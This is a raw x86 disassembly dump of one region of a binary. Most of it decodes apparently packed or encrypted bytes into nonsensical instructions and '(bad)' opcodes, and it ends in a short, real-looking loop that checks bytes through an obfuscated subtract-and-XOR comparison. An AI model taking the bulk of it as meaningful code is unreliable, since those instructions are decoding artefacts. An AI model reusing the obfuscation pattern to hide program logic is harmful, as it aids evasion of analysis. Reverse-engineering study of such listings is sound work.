  41a6e8:	xchg   ebx,eax
  41a6e9:	mov    BYTE PTR [esi+0x42],ah
  41a6ec:	in     eax,0x43
  41a6ee:	arpl   di,si
  41a6f0:	les    esi,FWORD PTR [eax+0x2]
  41a6f3:	mov    ss,WORD PTR [ebx]
  41a6f5:	pop    es
  41a6f6:	in     eax,dx
  41a6f7:	mov    dl,0xf8
  41a6f9:	xchg   edx,eax
  41a6fa:	mov    bh,dh
  41a6fc:	jg     0x41a683
  41a6fe:	cmp    bl,ch
  41a700:	cmp    edx,DWORD PTR [esp+esi*4]
  41a703:	jbe    0x41a777
  41a705:	in     al,0xf4
  41a707:	aam    0x35
  41a709:	out    dx,al
  41a70a:	mov    bl,0x81
  41a70c:	out    dx,al
  41a70d:	xchg   esp,eax
  41a70e:	aaa    
  41a70f:	xchg   edi,eax
  41a710:	test   al,0xc3
  41a712:	add    al,0x96
  41a714:	or     edi,esi
  41a716:	xchg   ebx,eax
  41a717:	adc    eax,0x9477baaa
  41a71c:	add    BYTE PTR [ebp-0xe34a3f9],ch
  41a722:	ds inc ebp
  41a724:	fwait
  41a725:	cmp    cl,ch
  41a727:	dec    eax
  41a728:	add    edx,DWORD PTR [edi]
  41a72a:	out    dx,eax
  41a72b:	jno    0x41a6e2
  41a72d:	(bad)  
  41a72e:	sbb    eax,DWORD PTR [esi+edx*2-0x4d236841]
  41a735:	adc    eax,0x63d8fed5
  41a73a:	sbb    DWORD PTR [edi],ebp
  41a73c:	add    BYTE PTR [eax-0x1a9c3b70],al
  41a742:	sub    DWORD PTR [ebp+ecx*2+0x62],esi
  41a746:	lds    ecx,FWORD PTR [edi-0x79]
  41a749:	sbb    dl,dl
  41a74b:	int3   
  41a74c:	cmp    eax,0xc096aefd
  41a751:	popf   
  41a752:	xlat   BYTE PTR ds:[ebx]
  41a753:	pop    edx
  41a754:	js     0x41a794
  41a756:	fld    TBYTE PTR [edx+0x4d]
  41a759:	sbb    al,BYTE PTR [ebx]
  41a75b:	cmp    BYTE PTR [ebx+ebp*8+0x55606ec8],0x67
  41a763:	add    DWORD PTR [ebp+0x479b1a66],edi
  41a769:	(bad)  
  41a76a:	out    dx,al
  41a76b:	fidiv  WORD PTR [edi]
  41a76d:	pop    esp
  41a76e:	nop
  41a76f:	fstp   TBYTE PTR [esi-0x45]
  41a772:	lods   eax,DWORD PTR ds:[esi]
  41a773:	xlat   BYTE PTR ds:[ebx]
  41a774:	adc    bh,BYTE PTR [edx]
  41a776:	popa   
  41a777:	(bad)  
  41a778:	cs enter 0xda0b,0xa9
  41a77d:	adc    DWORD PTR [eax+0x63a36f7],ecx
  41a783:	test   BYTE PTR ss:[eax-0x1d147d3e],ch
  41a78a:	es mov ecx,0xe2ed53f
  41a790:	sub    dh,BYTE PTR [esi-0x18]
  41a793:	add    edx,DWORD PTR [ebp+0x366a4d60]
  41a799:	inc    ebx
  41a79a:	pushf  
  41a79b:	dec    ebp
  41a79c:	sti    
  41a79d:	stos   DWORD PTR es:[edi],eax
  41a79e:	ja     0x41a72b
  41a7a0:	sbb    eax,0x77c756a1
  41a7a5:	shr    ah,0x94
  41a7a8:	lods   al,BYTE PTR ds:[esi]
  41a7a9:	fnstsw WORD PTR [ecx-0x39cdd509]
  41a7af:	fucom  st(2)
  41a7b1:	sti    
  41a7b2:	pop    ebx
  41a7b3:	inc    ebx
  41a7b4:	js     0x41a7db
  41a7b6:	jmp    0x41a753
  41a7b8:	dec    BYTE PTR [esi]
  41a7ba:	adc    al,0x43
  41a7bc:	add    DWORD PTR [edx-0x26],esp
  41a7bf:	push   ebp
  41a7c0:	jge    0x41a7fa
  41a7c2:	jmp    FWORD PTR [edi-0x2d78adda]
  41a7c8:	xor    DWORD PTR ds:0xe9d08c66,esp
  41a7ce:	mov    al,al
  41a7d0:	lea    esp,ds:0x16c52702
  41a7d6:	pop    ecx
  41a7d7:	adc    ah,BYTE PTR [ebx]
  41a7d9:	call   0x7f1ed488
  41a7de:	and    dl,BYTE PTR [esi]
  41a7e0:	sar    DWORD PTR [ebp+0x311b276b],1
  41a7e6:	mov    gs,WORD PTR [ecx]
  41a7e8:	push   es
  41a7e9:	es call 0x3d5a:0xe83c9109
  41a7f1:	cli    
  41a7f2:	xor    BYTE PTR [ebp+0x1f6e8231],cl
  41a7f8:	ret    0x18c5
  41a7fb:	loope  0x41a820
  41a7fd:	sub    al,0x6a
  41a7ff:	aad    0x38
  41a801:	pop    ebx
  41a802:	add    eax,0x432c97bd
  41a807:	ds ds iret 
  41a80a:	sti    
  41a80b:	sub    eax,0xb27353dd
  41a810:	inc    ebp
  41a811:	or     DWORD PTR [edi-0xa8a012e],esi
  41a817:	cmp    DWORD PTR [edx+ecx*1-0x1d],ecx
  41a81b:	push   es
  41a81c:	xor    bh,BYTE PTR [ebx]
  41a81e:	adc    DWORD PTR [ecx-0x23],0x72290059
  41a825:	pusha  
  41a826:	push   ecx
  41a827:	jp     0x41a80c
  41a829:	retf   0xbcf5
  41a82c:	inc    edi
  41a82d:	add    eax,0xd5a2aabf
  41a832:	retf   0xdb3b
  41a835:	sub    esi,DWORD PTR [ebx+0x4f081e46]
  41a83b:	outs   dx,BYTE PTR ds:[esi]
  41a83c:	in     al,0x44
  41a83e:	xchg   edx,eax
  41a83f:	lds    eax,FWORD PTR [edx]
  41a841:	in     al,0x81
  41a843:	aaa    
  41a844:	in     al,dx
  41a845:	xor    DWORD PTR [edx+eax*2-0xf],ebx
  41a849:	cmp    eax,0x3d1e9c39
  41a84e:	mov    dl,0x13
  41a850:	aas    
  41a851:	pop    esp
  41a852:	jne    0x41a817
  41a854:	xchg   edx,eax
  41a855:	inc    edx
  41a856:	dec    esp
  41a857:	mov    eax,0xa4f26bf3
  41a85c:	dec    ebp
  41a85d:	cwde   
  41a85e:	xor    eax,0x73074c25
  41a863:	inc    ebp
  41a864:	mov    eax,0x8d5f58b4
  41a869:	push   ecx
  41a86a:	outs   dx,BYTE PTR ds:[esi]
  41a86b:	test   ebp,ecx
  41a86d:	xchg   esi,eax
  41a86e:	retf   0xce6a
  41a871:	mov    ch,0x41
  41a873:	cmp    bh,ch
  41a875:	mov    ah,0x85
  41a877:	std    
  41a878:	add    al,BYTE PTR [ebp+eax*1+0x4]
  41a87c:	mov    al,ds:0xb9190020
  41a881:	(bad)  
  41a883:	lods   al,BYTE PTR ds:[esi]
  41a884:	xor    eax,0x3bfa4529
  41a889:	repnz cdq 
  41a88b:	push   ebx
  41a88c:	dec    edi
  41a88d:	inc    edi
  41a88e:	inc    ebx
  41a88f:	xchg   ebx,eax
  41a890:	jmp    0x41a825
  41a892:	cld    
  41a893:	xchg   edi,eax
  41a894:	jp     0x41a890
  41a896:	test   eax,esi
  41a898:	test   eax,0x9ed0330c
  41a89d:	sub    BYTE PTR [ebx+0x399d12d],0x22
  41a8a4:	jb     0x41a900
  41a8a6:	or     DWORD PTR [eax+0x41b26c6d],ebp
  41a8ac:	xchg   ebx,eax
  41a8ad:	jae    0x41a8cf
  41a8af:	push   eax
  41a8b0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a8b2:	repz dec edx
  41a8b4:	or     DWORD PTR [edx],edx
  41a8b6:	pop    edi
  41a8b7:	adc    al,BYTE PTR [edx+0x54]
  41a8ba:	mov    DWORD PTR [ebp-0x3dedd564],ebx
  41a8c0:	and    ch,dl
  41a8c2:	push   0xffffff8c
  41a8c4:	inc    ebp
  41a8c5:	ffreep st(1)
  41a8c7:	xchg   ebx,eax
  41a8c8:	out    0xa8,al
  41a8ca:	lds    ebp,FWORD PTR [esi-0x1f9d2ab4]
  41a8d0:	adc    eax,0xbde0feef
  41a8d5:	jb     0x41a8e7
  41a8d7:	mov    DWORD PTR [eax-0x17627224],esi
  41a8dd:	into   
  41a8de:	rcl    eax,cl
  41a8e0:	hlt    
  41a8e1:	(bad)  
  41a8e2:	mov    bh,0xf4
  41a8e4:	dec    ebx
  41a8e5:	xor    dh,BYTE PTR [edx-0x2ba736f9]
  41a8eb:	(bad)  
  41a8ed:	push   0x8db5210e
  41a8f2:	leave  
  41a8f3:	test   BYTE PTR [eax+0x54],cl
  41a8f6:	xchg   edi,eax
  41a8f7:	sub    ch,al
  41a8f9:	sub    ch,BYTE PTR [edi]
  41a8fb:	dec    edi
  41a8fc:	fisubr DWORD PTR [eax+0x65]
  41a8ff:	jb     0x41a912
  41a901:	(bad)  
  41a902:	call   0x45b5fbcc
  41a907:	scas   al,BYTE PTR es:[edi]
  41a908:	sti    
  41a909:	fld    TBYTE PTR [ebx]
  41a90b:	fsub   QWORD PTR [ecx+0x77]
  41a90e:	add    eax,esp
  41a910:	or     BYTE PTR [edx-0x43],bl
  41a913:	pop    esi
  41a914:	iret   
  41a915:	sbb    DWORD PTR [eax-0x12a782c1],ebp
  41a91b:	lods   al,BYTE PTR ds:[esi]
  41a91c:	fisttp WORD PTR [edi-0x39]
  41a91f:	mov    esi,0xa81c9dc4
  41a924:	mov    al,ds:0xb9b85a2b
  41a929:	mov    al,BYTE PTR [eax-0x4e]
  41a92c:	push   ebx
  41a92d:	cmp    ebx,edi
  41a92f:	sub    DWORD PTR cs:[edx],ebx
  41a932:	push   edx
  41a933:	shl    BYTE PTR [eax-0x18],1
  41a936:	and    BYTE PTR [esp+ebx*8-0x23bbf92a],bl
  41a93d:	ja     0x41a8cf
  41a93f:	cmp    al,0x1c
  41a941:	mov    ecx,DWORD PTR ds:0xf4e2460f
  41a947:	ds or  al,0x1c
  41a94a:	mov    DWORD PTR [ecx],eax
  41a94c:	push   0xffffffaa
  41a94e:	and    DWORD PTR [esp+eax*8],edi
  41a951:	mov    bh,0x94
  41a953:	(bad)  
  41a955:	stc    
  41a956:	pop    ebx
  41a957:	jge    0x41a8f7
  41a959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a95a:	mov    bl,BYTE PTR [ecx]
  41a95c:	adc    dh,BYTE PTR [esi-0x31]
  41a95f:	and    eax,0x435fd54e
  41a964:	fcomp  DWORD PTR [edi-0x64f344c1]
  41a96a:	test   al,0x29
  41a96c:	idiv   DWORD PTR [eax]
  41a96e:	out    dx,eax
  41a96f:	out    dx,eax
  41a970:	push   ebx
  41a971:	in     al,dx
  41a972:	inc    esp
  41a973:	xchg   esp,eax
  41a974:	sbb    ebx,ebx
  41a976:	ret    0x66d5
  41a979:	hlt    
  41a97a:	pop    es
  41a97b:	pop    esp
  41a97c:	push   cs
  41a97d:	popa   
  41a97e:	(bad)  
  41a97f:	pusha  
  41a980:	push   ecx
  41a981:	xor    dl,BYTE PTR ds:0xe802e50d
  41a987:	es dec esi
  41a989:	iret   
  41a98a:	in     al,dx
  41a98b:	out    dx,al
  41a98c:	jmp    0x41a9a3
  41a98e:	cmp    BYTE PTR [edx+0x2cd896d9],0x74
  41a995:	fidivr WORD PTR [edi]
  41a997:	push   eax
  41a998:	mov    ch,0xef
  41a99a:	loopne 0x41a922
  41a99c:	dec    esp
  41a99d:	std    
  41a99e:	shl    dh,0xb8
  41a9a1:	das    
  41a9a2:	ficomp WORD PTR [ebx-0x1a]
  41a9a5:	shl    BYTE PTR [ebx],0x34
  41a9a8:	mov    bl,0x90
  41a9aa:	mov    dh,0x16
  41a9ac:	not    BYTE PTR [esp+edx*2]
  41a9af:	imul   esp,DWORD PTR [ebx+0x1c3fb37b],0xa
  41a9b6:	repz ss push eax
  41a9b9:	dec    esp
  41a9ba:	les    ecx,FWORD PTR [esi]
  41a9bc:	cmp    edx,DWORD PTR [ebp+0x23b8fcb0]
  41a9c2:	shl    DWORD PTR [esi+0x5829e9dd],1
  41a9c8:	fsubp  st(1),st
  41a9ca:	sahf   
  41a9cb:	outs   dx,BYTE PTR ds:[esi]
  41a9cc:	or     eax,0xae7e4bf
  41a9d1:	inc    esi
  41a9d2:	xor    eax,0xe9a7fd28
  41a9d7:	(bad)  
  41a9d8:	aam    0x48
  41a9da:	mov    esp,0xc3a786ae
  41a9df:	xchg   edx,eax
  41a9e0:	fnstsw WORD PTR [ecx+eax*4]
  41a9e3:	xchg   ecx,eax
  41a9e4:	xchg   ebp,edi
  41a9e6:	xchg   ecx,eax
  41a9e7:	clc    
  41a9e8:	adc    DWORD PTR [esi+0x15],esp
  41a9eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9ec:	pop    ebp
  41a9ed:	push   esp
  41a9ee:	push   0x59
  41a9f0:	xchg   ebp,eax
  41a9f1:	stc    
  41a9f2:	cdq    
  41a9f3:	cld    
  41a9f4:	jg     0x41a9d3
  41a9f6:	repnz fldenv [ecx]
  41a9f9:	mov    ecx,DWORD PTR [ebp+eiz*1-0x1496bd65]
  41aa00:	test   DWORD PTR [ecx+0x7e],0xe681c3a5
  41aa07:	aad    0x36
  41aa09:	cdq    
  41aa0a:	pop    eax
  41aa0b:	xchg   ebp,eax
  41aa0c:	sti    
  41aa0d:	pop    edi
  41aa0e:	push   eax
  41aa0f:	sahf   
  41aa10:	lds    ebx,FWORD PTR [ecx-0x7f74e10e]
  41aa16:	mov    al,ds:0x8dd6beb8
  41aa1b:	xor    ebp,edi
  41aa1d:	pop    esp
  41aa1e:	cdq    
  41aa1f:	mov    edi,0xc99a6a73
  41aa24:	jns    0x41aa3b
  41aa26:	in     eax,0xf3
  41aa28:	xor    BYTE PTR [esi-0x1cef7fe4],ah
  41aa2e:	jbe    0x41aa8d
  41aa30:	ds xchg edi,eax
  41aa32:	push   ds
  41aa33:	push   ss
  41aa34:	sbb    BYTE PTR [ebp+0x1f],0x29
  41aa38:	lahf   
  41aa39:	popf   
  41aa3a:	lds    edi,FWORD PTR [esi]
  41aa3c:	mov    esp,DWORD PTR [ebx-0x619c7896]
  41aa42:	(bad)  
  41aa43:	sub    eax,0x6f731ce9
  41aa48:	adc    ch,bh
  41aa4a:	addr16 std 
  41aa4c:	mov    ecx,0xac58bb45
  41aa51:	adc    ah,BYTE PTR [ebx+0x1aeaff4a]
  41aa57:	aas    
  41aa58:	aas    
  41aa59:	pop    edi
  41aa5a:	inc    esp
  41aa5b:	push   edi
  41aa5c:	pushf  
  41aa5d:	xchg   ebx,eax
  41aa5e:	xlat   BYTE PTR ds:[ebx]
  41aa5f:	jl     0x41aaa1
  41aa61:	ror    DWORD PTR [ebp-0x4d],1
  41aa64:	ins    DWORD PTR es:[edi],dx
  41aa65:	pop    edx
  41aa66:	pop    es
  41aa67:	sti    
  41aa68:	mov    eax,0xe354294f
  41aa6d:	adc    bh,BYTE PTR [ecx-0x15675a61]
  41aa73:	push   ecx
  41aa74:	and    bl,BYTE PTR [ecx-0x5cd044d7]
  41aa7a:	ins    BYTE PTR es:[edi],dx
  41aa7b:	imul   eax,DWORD PTR [edi+0x560c83b2],0xa0a05a2c
  41aa85:	and    BYTE PTR [eax+0x3d],ah
  41aa88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa89:	dec    edx
  41aa8a:	int    0x2
  41aa8c:	or     ah,cl
  41aa8e:	push   ecx
  41aa8f:	sbb    eax,0x524c0059
  41aa94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa95:	fbstp  TBYTE PTR [ebp-0x75]
  41aa98:	retf   
  41aa99:	imul   eax,DWORD PTR [ecx+0x2d],0xffffffa2
  41aa9d:	lahf   
  41aa9e:	push   ecx
  41aa9f:	imul   esp,DWORD PTR ds:0xc082a76f,0x8cdd738a
  41aaa9:	cmp    ah,BYTE PTR [ebx+0x116c4f86]
  41aaaf:	int3   
  41aab0:	out    0x86,eax
  41aab2:	in     eax,dx
  41aab3:	pop    eax
  41aab4:	test   DWORD PTR [ebp+0xf],0xcf1caf53
  41aabb:	sbb    edi,edi
  41aabd:	push   ecx
  41aabe:	and    BYTE PTR [edi+0x1af29f1f],cl
  41aac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aac5:	xchg   edx,eax
  41aac6:	adc    DWORD PTR [eax],eax
  41aac8:	addr16 pop ds
  41aaca:	and    al,0x12
  41aacc:	push   ebp
  41aacd:	dec    ebp
  41aace:	lea    ebp,[ecx+0x2cb62068]
  41aad4:	lods   al,BYTE PTR ds:[esi]
  41aad5:	out    0xe6,al
  41aad7:	js     0x41aaad
  41aad9:	cmp    eax,0x2e0b6835
  41aade:	xor    DWORD PTR [ecx-0x18d0a2e],0x282216b4
  41aae8:	sbb    eax,DWORD PTR ds:0xa9483ac7
  41aaee:	sbb    ebx,0xd9ed1558
  41aaf4:	sub    al,0xe0
  41aaf6:	std    
  41aaf7:	sub    BYTE PTR [eax+0x47f51a05],0x17
  41aafe:	icebp  
  41aaff:	retf   0xe60b
  41ab02:	mov    esi,0xff7ed6e3
  41ab07:	fld    DWORD PTR [edx]
  41ab09:	mov    ?,WORD PTR [ebx-0x5e942d83]
  41ab0f:	loop   0x41ab12
  41ab11:	push   ebx
  41ab12:	jae    0x41aad5
  41ab14:	sbb    DWORD PTR [edx+0x1ec88ea0],0xfffffff1
  41ab1b:	pop    ecx
  41ab1c:	mov    cl,0xc8
  41ab1e:	mov    edx,0xbe236c32
  41ab23:	ret    0x35d0
  41ab26:	add    DWORD PTR [eax+0x33bc500d],0x59
  41ab2d:	jnp    0x41ab9d
  41ab2f:	or     esp,0x668ebc97
  41ab35:	jae    0x41ab7a
  41ab37:	or     BYTE PTR [ebp-0x2b],dl
  41ab3a:	ficomp WORD PTR [eax-0x28]
  41ab3d:	jle    0x41ab37
  41ab3f:	hlt    
  41ab40:	sbb    al,0xf6
  41ab42:	mov    ecx,0x4c924f0b
  41ab47:	pop    esi
  41ab48:	or     DWORD PTR [esp],0x18
  41ab4c:	and    edx,DWORD PTR [ebx-0x4a]
  41ab4f:	cmp    al,0x3d
  41ab51:	sub    edx,ebx
  41ab53:	stos   DWORD PTR es:[edi],eax
  41ab54:	ss dec ebx
  41ab56:	(bad)  
  41ab57:	sbb    BYTE PTR [eax+0x6af02642],ah
  41ab5d:	(bad)  
  41ab5e:	jmp    0xefc892f7
  41ab63:	retf   
  41ab64:	mov    ebx,0xa70ae558
  41ab69:	pop    ebx
  41ab6a:	enter  0xe083,0x2f
  41ab6e:	ja     0x41ab89
  41ab70:	adc    eax,0xa26a57e1
  41ab75:	enter  0x2fa4,0x67
  41ab79:	jb     0x41abd0
  41ab7b:	mov    dl,cl
  41ab7d:	fmul   DWORD PTR [esi+0x17]
  41ab80:	push   ebp
  41ab81:	mov    esi,DWORD PTR [ebx+ecx*4-0x11762807]
  41ab88:	outs   dx,BYTE PTR ds:[esi]
  41ab89:	mov    bh,BYTE PTR [ebp+esi*8+0x7a]
  41ab8d:	push   ebp
  41ab8e:	fmul   QWORD PTR [edi+ecx*4+0xa]
  41ab92:	loop   0x41abff
  41ab94:	fcomp  QWORD PTR [eax-0x35e75453]
  41ab9a:	xchg   edx,eax
  41ab9b:	pop    ss
  41ab9c:	sahf   
  41ab9d:	pop    eax
  41ab9e:	inc    ebp
  41ab9f:	(bad)  
  41aba0:	pop    edx
  41aba1:	push   eax
  41aba2:	jae    0x41ab28
  41aba4:	dec    ecx
  41aba5:	push   ebp
  41aba6:	inc    edi
  41aba7:	dec    dx
  41aba9:	shl    DWORD PTR [edi+0x7919257e],1
  41abaf:	xlat   BYTE PTR ds:[ebx]
  41abb0:	pop    ss
  41abb1:	pushf  
  41abb2:	inc    ebx
  41abb3:	add    BYTE PTR [ecx+ecx*4],bl
  41abb6:	mov    WORD PTR [ebx],?
  41abb8:	jp     0x41abb8
  41abba:	inc    edi
  41abbb:	fiadd  DWORD PTR [edi*1+0x3895543c]
  41abc2:	adc    ecx,DWORD PTR [eax+0x2baeaf8f]
  41abc8:	stos   BYTE PTR es:[edi],al
  41abc9:	cwde   
  41abca:	rol    BYTE PTR [ecx-0x27],1
  41abcd:	shr    eax,1
  41abcf:	in     eax,0x25
  41abd1:	sbb    ah,BYTE PTR ds:0x5b84e8f3
  41abd7:	add    eax,0x2f634a73
  41abdc:	(bad)  
  41abde:	xor    al,BYTE PTR [ecx-0x37daca25]
  41abe4:	dec    esi
  41abe5:	out    dx,al
  41abe6:	push   ss
  41abe7:	inc    ebx
  41abe8:	or     al,0x26
  41abea:	mov    fs,esp
  41abec:	dec    esp
  41abed:	jnp    0x41abf5
  41abef:	lock push edi
  41abf1:	xor    BYTE PTR [edi+0x72a522b8],al
  41abf7:	in     eax,0xa6
  41abf9:	lods   eax,DWORD PTR ds:[esi]
  41abfa:	xchg   esi,eax
  41abfb:	adc    esp,DWORD PTR [edi]
  41abfd:	scas   al,BYTE PTR es:[edi]
  41abfe:	test   edi,ebx
  41ac00:	fwait
  41ac01:	cmp    al,0x79
  41ac03:	aas    
  41ac04:	add    BYTE PTR [esi+0x60480ee9],dl
  41ac0a:	outs   dx,DWORD PTR ds:[esi]
  41ac0b:	scas   al,BYTE PTR es:[edi]
  41ac0c:	sbb    BYTE PTR [edx+edx*8-0x52],bh
  41ac10:	mov    dh,BYTE PTR [ebx+0x25]
  41ac13:	dec    ecx
  41ac14:	push   edx
  41ac15:	bound  eax,QWORD PTR [edx]
  41ac17:	sbb    DWORD PTR [eax-0x20012ccf],0xa8e6df88
  41ac21:	xor    bh,BYTE PTR [esi]
  41ac23:	xor    dh,al
  41ac25:	setnp  BYTE PTR [edi+0x1d78cedc]
  41ac2c:	int3   
  41ac2d:	xor    al,0x15
  41ac2f:	cmp    dh,BYTE PTR [ebx]
  41ac31:	add    edx,DWORD PTR [ebx]
  41ac33:	jl     0x41ac6c
  41ac35:	arpl   WORD PTR [edi-0x45],si
  41ac38:	div    BYTE PTR [esp+ebp*1-0x3aaf878e]
  41ac3f:	lods   eax,DWORD PTR ds:[esi]
  41ac40:	mov    ebx,0xa87a9f28
  41ac45:	adc    edi,DWORD PTR [edi+0x4c]
  41ac48:	mov    edi,0xbaa2ca2f
  41ac4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac4e:	pop    esi
  41ac4f:	cld    
  41ac50:	fwait
  41ac51:	lahf   
  41ac52:	add    edx,DWORD PTR [edx-0x6a0cf0af]
  41ac58:	loop   0x41ac63
  41ac5a:	ror    ch,1
  41ac5c:	(bad)  
  41ac5d:	clc    
  41ac5e:	inc    ebx
  41ac5f:	jno    0x41acd5
  41ac61:	icebp  
  41ac62:	xchg   ebx,eax
  41ac63:	xchg   ecx,eax
  41ac64:	mov    BYTE PTR [eax],ah
  41ac66:	cmp    eax,0xc47f862e
  41ac6b:	push   ds
  41ac6c:	popa   
  41ac6d:	rol    dl,0x0
  41ac70:	ss mov dl,0x98
  41ac73:	sbb    al,0xcd
  41ac75:	adc    eax,0x38af3a09
  41ac7a:	test   BYTE PTR ds:0x9b069864,al
  41ac80:	push   si
  41ac82:	push   0x4
  41ac84:	inc    ebx
  41ac85:	jmp    0x6443fb02
  41ac8a:	and    BYTE PTR [eax],bh
  41ac8c:	stos   DWORD PTR es:[edi],eax
  41ac8d:	jmp    0xd220:0x722cff87
  41ac94:	ret    0x43ba
  41ac97:	inc    ebp
  41ac98:	sbb    edi,esi
  41ac9a:	xor    al,0xad
  41ac9c:	inc    esp
  41ac9d:	out    0x5f,al
  41ac9f:	pop    es
  41aca0:	std    
  41aca1:	jae    0x41ad1d
  41aca3:	or     ebx,DWORD PTR [ecx]
  41aca5:	in     eax,dx
  41aca6:	push   ss
  41aca7:	out    dx,eax
  41aca8:	call   0x81545846
  41acad:	jne    0x41acbd
  41acaf:	mov    ebx,DWORD PTR [ebx]
  41acb1:	repnz mov bh,0x7c
  41acb4:	ficomp DWORD PTR [edx+ebp*8+0x5a]
  41acb8:	push   DWORD PTR [esi-0x7158b626]
  41acbe:	int3   
  41acbf:	push   ebp
  41acc0:	hlt    
  41acc1:	cs (bad) 
  41acc3:	aam    0xa0
  41acc5:	psadbw mm1,QWORD PTR [edi+0x4d]
  41acc9:	xor    BYTE PTR [ecx-0x4984a18e],al
  41accf:	sbb    BYTE PTR [edi-0x18647ff1],0xa7
  41acd6:	sbb    edi,edi
  41acd8:	push   ss
  41acd9:	outs   dx,BYTE PTR ds:[esi]
  41acda:	out    0xbf,eax
  41acdc:	sub    cl,dl
  41acde:	(bad)  
  41acdf:	std    
  41ace0:	mul    BYTE PTR [eax]
  41ace2:	daa    
  41ace3:	jne    0x41aca9
  41ace5:	div    DWORD PTR ss:[edi-0x64692c71]
  41acec:	cmp    esi,esi
  41acee:	push   cs
  41acef:	inc    ebp
  41acf0:	(bad)  
  41acf1:	int3   
  41acf2:	inc    edx
  41acf3:	sbb    eax,0x3c01cfeb
  41acf8:	fs aad 0x7
  41acfb:	leave  
  41acfc:	add    DWORD PTR [eax],esi
  41acfe:	paddusw mm7,QWORD PTR [esi]
  41ad01:	jp     0x41ace5
  41ad03:	shl    DWORD PTR [edx+0x685be0e],1
  41ad09:	push   ebx
  41ad0a:	jo     0x41ace2
  41ad0c:	add    BYTE PTR [esi-0x6a],dl
  41ad0f:	lods   eax,DWORD PTR ds:[esi]
  41ad10:	loopne 0x41ad87
  41ad12:	fwait
  41ad13:	ja     0x41ad6d
  41ad15:	jns    0x41ad2e
  41ad17:	lods   al,BYTE PTR ds:[esi]
  41ad18:	add    DWORD PTR [edx],eax
  41ad1a:	dec    ebx
  41ad1b:	test   BYTE PTR [ecx+ecx*1-0xd],ah
  41ad1f:	xchg   ecx,eax
  41ad20:	pop    edi
  41ad21:	sti    
  41ad22:	xor    dl,bl
  41ad24:	ins    BYTE PTR es:[edi],dx
  41ad25:	ja     0x41aca8
  41ad27:	fmul   QWORD PTR [edi]
  41ad29:	lock or al,0xac
  41ad2c:	pop    esi
  41ad2d:	jp     0x41ad76
  41ad2f:	pop    es
  41ad30:	sub    dl,BYTE PTR [edx+0x6f]
  41ad33:	add    BYTE PTR [ecx+0x17],bl
  41ad36:	pop    edx
  41ad37:	nop
  41ad38:	call   0xa964:0x9430d660
  41ad3f:	sub    BYTE PTR [ecx-0x26],al
  41ad42:	xlat   BYTE PTR ds:[ebx]
  41ad43:	jne    0x41ad55
  41ad45:	mov    eax,0xe2cc2f83
  41ad4a:	add    al,0x28
  41ad4c:	or     eax,0xa01e649
  41ad51:	pushf  
  41ad52:	rcr    eax,0xb8
  41ad55:	jns    0x41add2
  41ad57:	mov    ds:0x2df2b66e,al
  41ad5c:	je     0x41ad23
  41ad5e:	cmp    al,0xfc
  41ad60:	ret    0xf0fd
  41ad63:	jae    0x41adbc
  41ad65:	outs   dx,DWORD PTR ds:[esi]
  41ad66:	imul   esi,DWORD PTR [esi+edx*2],0x42
  41ad6a:	pop    edx
  41ad6b:	push   esp
  41ad6c:	fwait
  41ad6d:	xchg   ebx,eax
  41ad6e:	jecxz  0x41ad09
  41ad70:	fidivr DWORD PTR [ebx+0xe]
  41ad73:	mov    cl,0x54
  41ad75:	mov    fs,WORD PTR [ebp-0x1a]
  41ad78:	inc    ecx
  41ad79:	sbb    BYTE PTR [eax],bl
  41ad7b:	cmp    DWORD PTR [ecx],esp
  41ad7d:	bnd ja 0x41ad36
  41ad80:	cdq    
  41ad81:	mul    BYTE PTR [ebx-0x1d7b8978]
  41ad87:	fisttp DWORD PTR [ebp+0x23354f2e]
  41ad8d:	pop    ecx
  41ad8e:	or     DWORD PTR [eax-0x7e],esp
  41ad91:	and    BYTE PTR [ecx+ecx*4-0x10],ch
  41ad95:	cs das 
  41ad97:	(bad)
  41ad9b:	xor    eax,0x5323d3d0
  41ada0:	cmp    DWORD PTR [ecx+0x5f],ebx
  41ada3:	aad    0xc
  41ada5:	inc    eax
  41ada6:	outs   dx,BYTE PTR ds:[esi]
  41ada7:	cmp    DWORD PTR [eax+0x36],edi
  41adaa:	and    ah,cl
  41adac:	(bad)  
  41adad:	mov    edx,0x679b527c
  41adb2:	pop    ecx
  41adb3:	and    ch,BYTE PTR [edx+0x3d3a7614]
  41adb9:	cmp    al,BYTE PTR [eax-0x6f]
  41adbc:	call   0x52aa088d
  41adc1:	cwde   
  41adc2:	cld    
  41adc3:	outs   dx,BYTE PTR ds:[esi]
  41adc4:	lds    esp,FWORD PTR [esi]
  41adc6:	icebp  
  41adc7:	retf   
  41adc8:	not    BYTE PTR [ebx]
  41adca:	adc    esi,DWORD PTR [esi-0x5cfdbdcd]
  41add0:	mov    DWORD PTR [ebp-0x67],edi
  41add3:	nop
  41add4:	xor    ebx,ecx
  41add6:	mov    ebx,DWORD PTR [edx-0x5f]
  41add9:	pop    ebp
  41adda:	psubb  mm1,QWORD PTR [edi+0x58795704]
  41ade1:	icebp  
  41ade2:	mov    eax,0x128360c3
  41ade7:	pop    ebp
  41ade8:	ret    0x3d5b
  41adeb:	inc    ebx
  41adec:	mov    DWORD PTR [ebp-0x8],eax
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c16
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
